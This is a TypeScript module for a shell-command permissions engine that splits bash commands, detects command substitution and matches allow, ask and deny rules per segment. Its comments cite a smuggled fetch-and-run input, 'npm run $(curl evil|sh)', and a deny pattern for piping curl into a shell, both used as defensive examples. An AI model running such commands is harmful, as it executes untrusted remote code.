/**
 * Bash-specific utilities for the permissions policy engine.
 *
 * Provides a quote-aware command splitter, a command-substitution safety check,
 * a flag-stop grant pattern deriver, and segment-aware policy matchers used by
 * `policy.ts` for all bash decision paths.
 */

import type { CompiledGrant, CompiledRule } from "./types.ts";

// ── Splitting ─────────────────────────────────────────────────────────────────

/**
 * Split a bash command string into top-level segments.
 *
 * Splits on `&&`, `||`, `|`, `;`, `\n`, and trailing `&` (backgrounding).
 * The split is single/double-quote-aware: separators inside quotes are ignored.
 * Two-character operators (`&&`, `||`) are matched before their single-char
 * prefixes so `&&` is never split into `&`+`&`. Empty segments are dropped.
 *
 * Fail-direction: segments that cannot be confidently parsed are returned as-is;
 * callers must treat unrecognized segments as uncoverable.
 */
export function splitBashSegments(cmd: string): string[] {
  const segments: string[] = [];
  let current = "";
  let inSingle = false;
  let inDouble = false;
  let i = 0;

  while (i < cmd.length) {
    const ch = cmd[i]!;

    if (inSingle) {
      current += ch;
      if (ch === "'") inSingle = false;
      i++;
      continue;
    }

    if (inDouble) {
      current += ch;
      // A backslash before the closing quote does not end double-quote mode.
      if (ch === '"' && (i === 0 || cmd[i - 1] !== "\\")) inDouble = false;
      i++;
      continue;
    }

    // Enter quote modes
    if (ch === "'") {
      inSingle = true;
      current += ch;
      i++;
      continue;
    }
    if (ch === '"') {
      inDouble = true;
      current += ch;
      i++;
      continue;
    }

    // Two-char operators (check before single-char to avoid mis-splitting)
    if (i + 1 < cmd.length) {
      const two = cmd.slice(i, i + 2);
      if (two === "||" || two === "&&") {
        const seg = current.trim();
        if (seg) segments.push(seg);
        current = "";
        i += 2;
        continue;
      }
    }

    // Single-char separators: | ; \n &
    if (ch === "|" || ch === ";" || ch === "\n" || ch === "&") {
      const seg = current.trim();
      if (seg) segments.push(seg);
      current = "";
      i++;
      continue;
    }

    current += ch;
    i++;
  }

  const last = current.trim();
  if (last) segments.push(last);
  return segments;
}

// ── Substitution safety ───────────────────────────────────────────────────────

/**
 * Return true if a bash segment contains command substitution (`$(…)` or a backtick).
 * Such segments are treated as uncoverable by allow rules — they can hide arbitrary
 * sub-commands (e.g. `npm run $(curl evil|sh)`).
 *
 * `$((…))` arithmetic expansion is NOT flagged because it cannot execute shell commands.
 */
export function hasUnsafeSubstitution(seg: string): boolean {
  if (seg.includes("`")) return true;
  let idx = seg.indexOf("$(");
  while (idx !== -1) {
    // $( followed by another ( is arithmetic — safe
    if (seg[idx + 2] !== "(") return true;
    idx = seg.indexOf("$(", idx + 1);
  }
  return false;
}

// ── Pattern derivation (flag-stop) ───────────────────────────────────────────

/**
 * Return true if a token qualifies as a "bare word" for flag-stop capture.
 * A token ends the capture prefix if it starts with `-` (flag), or contains
 * `/` (path), `=` (assignment/value), or a glob/quote character.
 */
export function isBareWord(token: string): boolean {
  if (token.startsWith("-")) return false;
  if (/[/=*?[\]'"]/.test(token)) return false;
  return true;
}

/**
 * Derive an anchored flag-stop regex pattern for a single bash segment.
 *
 * Strips leading `VAR=val` env-var assignments, then captures the command name
 * plus all following bare-word tokens up to the first flag, path, value, or glob.
 * Inter-token gaps become `\s+`; the pattern is anchored `^…\b`.
 *
 * Examples:
 *   `npm run build`            → `^npm\s+run\s+build\b`
 *   `npm install`              → `^npm\s+install\b`
 *   `git commit -m "msg"`      → `^git\s+commit\b`
 *   `mycli foo bar`            → `^mycli\s+foo\s+bar\b`
 *   `NODE_ENV=prod npm run x`  → `^npm\s+run\s+x\b`
 *
 * Over-capture on positional args (e.g. `docker run ubuntu` →
 * `^docker\s+run\s+ubuntu\b`) is intentional: a narrower pattern is safer and the
 * operator can broaden it in the editor.
 */
export function deriveBashPattern(segment: string): string {
  // Strip leading VAR=val assignments (e.g. NODE_ENV=prod)
  const stripped = segment.replace(/^(\w+=\S*\s+)+/, "").trim();
  if (!stripped) return "^(?:)";

  const tokens = stripped.split(/\s+/);
  const kept: string[] = [];
  for (const tok of tokens) {
    if (kept.length === 0) {
      // Always keep the command name, even if it looks like a flag
      kept.push(tok);
    } else if (isBareWord(tok)) {
      kept.push(tok);
    } else {
      break; // flag-stop
    }
  }

  const escaped = kept.map((t) => t.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"));
  return `^${escaped.join("\\s+")}\\b`;
}

/**
 * Derive deduped grant patterns for a (possibly compound) bash command.
 * Splits the command into segments and derives one pattern per segment.
 * Duplicate patterns (e.g. from `npm run a && npm run a`) are collapsed to one.
 */
export function deriveBashPatterns(command: string): string[] {
  const segments = splitBashSegments(command);
  const seen = new Set<string>();
  const patterns: string[] = [];
  for (const seg of segments) {
    const p = deriveBashPattern(seg);
    if (!seen.has(p)) {
      seen.add(p);
      patterns.push(p);
    }
  }
  return patterns;
}

// ── Segment-aware matching helpers ───────────────────────────────────────────

/** Run a regex safely, swallowing runtime errors (ReDoS accepted risk). */
function safeTest(regex: RegExp, target: string): boolean {
  try {
    return regex.test(target);
  } catch {
    return false;
  }
}

/**
 * Return true if every segment of a bash command is covered by at least one matcher.
 *
 * A segment with unsafe command substitution (backtick or `$(`) is never covered,
 * ensuring `npm run $(curl evil|sh)` always falls through to ask/deny.
 */
export function allSegmentsCovered(segments: string[], matchers: readonly RegExp[]): boolean {
  if (segments.length === 0) return false;
  for (const seg of segments) {
    if (hasUnsafeSubstitution(seg)) return false;
    if (!matchers.some((m) => safeTest(m, seg))) return false;
  }
  return true;
}

/**
 * Return true if any segment matches at least one matcher.
 * Used for ASK semantics: fire if any segment is flagged.
 */
export function anySegmentMatches(segments: string[], matchers: readonly RegExp[]): boolean {
  return segments.some((seg) => matchers.some((m) => safeTest(m, seg)));
}

/**
 * Return true if a deny pattern fires against any segment OR the full command string.
 *
 * The whole-command check preserves pipe-spanning deny patterns such as
 * `curl[^|]*\|\s*(bash|sh)\b` which would never fire on split segments alone.
 */
export function denyMatches(
  command: string,
  segments: string[],
  matchers: readonly RegExp[],
): boolean {
  if (matchers.some((m) => safeTest(m, command))) return true;
  return segments.some((seg) => matchers.some((m) => safeTest(m, seg)));
}

/**
 * Segment-aware bash config-rule matching.
 *
 * - `deny`:  fires if any segment matches OR the whole command matches.
 * - `ask`:   fires if any segment matches.
 * - `allow`: fires only if every segment is covered (and no unsafe substitution).
 */
export function bashRuleMatches(
  rules: CompiledRule[],
  action: "allow" | "ask" | "deny",
  toolName: string,
  command: string,
  segments: string[],
): boolean {
  const matching = rules.filter(
    (r) => r.action === action && (r.tool === toolName || r.tool === "*"),
  );
  if (matching.length === 0) return false;
  const matchers = matching.map((r) => r.regex);

  if (action === "allow") return allSegmentsCovered(segments, matchers);
  if (action === "ask") return anySegmentMatches(segments, matchers);
  // deny: per-segment OR whole command
  return denyMatches(command, segments, matchers);
}

/**
 * Segment-aware grant coverage check for bash commands.
 * Requires every segment to be covered by the grant's regex.
 * A segment with unsafe substitution is never covered.
 */
export function bashGrantCovers(
  grant: CompiledGrant,
  toolName: string,
  command: string,
  segments: string[],
): boolean {
  if (grant.tool !== toolName && grant.tool !== "*") return false;
  if (!grant.regex) return false;
  return allSegmentsCovered(segments, [grant.regex]);
}
